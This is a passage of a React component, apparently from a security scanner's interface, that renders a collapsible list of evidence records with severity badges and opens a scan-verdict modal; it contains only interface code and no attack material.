              onClick={() => setShowPopup(true)}
              className="flex items-center gap-1.5 px-3 py-2 rounded-xl bg-indigo-50/50 hover:bg-indigo-50 text-indigo-600 text-xs font-semibold transition-all cursor-pointer border border-indigo-100 ml-auto"
            >
              <Sparkles className="w-3.5 h-3.5 text-indigo-600" />
              <span>Re-open Verdict Popup Card</span>
            </button>
          </div>

          {/* Collapsible Technical Telemetry Breakdown */}
          <div className="pt-2 border-t border-slate-100">
            <button
              onClick={() => setShowTechnicalDetails(!showTechnicalDetails)}
              className="w-full flex items-center justify-between text-xs font-bold text-slate-600 hover:text-slate-900 cursor-pointer py-1"
            >
              <span>Detailed Extracted Evidence Records ({evidence.length} Indicators)</span>
              {showTechnicalDetails ? (
                <ChevronUp className="w-4 h-4 text-slate-400" />
              ) : (
                <ChevronDown className="w-4 h-4 text-slate-400" />
              )}
            </button>

            {showTechnicalDetails && (
              <div className="mt-3 space-y-2">
                {evidence.map((ev) => (
                  <div
                    key={ev.id}
                    className="p-3 rounded-xl border border-slate-100 bg-slate-50 flex items-start justify-between gap-3 text-xs"
                  >
                    <div>
                      <div className="font-bold text-slate-800">{ev.title}</div>
                      <div className="text-slate-500 text-[11px] mt-0.5">{ev.description}</div>
                      <div className="text-[10px] font-mono text-slate-400 mt-1">
                        Source: {ev.extraction_source} • Category: {ev.category}
                      </div>
                    </div>
                    <span
                      className={`text-[10px] font-bold px-2 py-0.5 rounded-md border shrink-0 ${
                        ev.severity === 'CRITICAL'
                          ? 'bg-rose-50 text-rose-700 border-rose-200'
                          : ev.severity === 'HIGH'
                          ? 'bg-amber-50 text-amber-700 border-amber-200'
                          : ev.severity === 'MEDIUM'
                          ? 'bg-yellow-50 text-yellow-800 border-yellow-200'
                          : 'bg-slate-100 text-slate-600 border-slate-200'
                      }`}
                    >
                      {ev.severity}
                    </span>
                  </div>
                ))}
              </div>
            )}
          </div>
        </div>
      )}

      {/* Interactive Scan Verdict Modal */}
      {result && (
        <ScanVerdictModal
          isOpen={showPopup}
          onClose={() => setShowPopup(false)}
          verdict={result}
          evidence={evidence}
          onNavigateToDetails={() => onNavigateToDetails(result.id)}
          onNavigateToDefense={() => onNavigateToDefense?.(result.id)}
        />
      )}
    </div>
  );
};
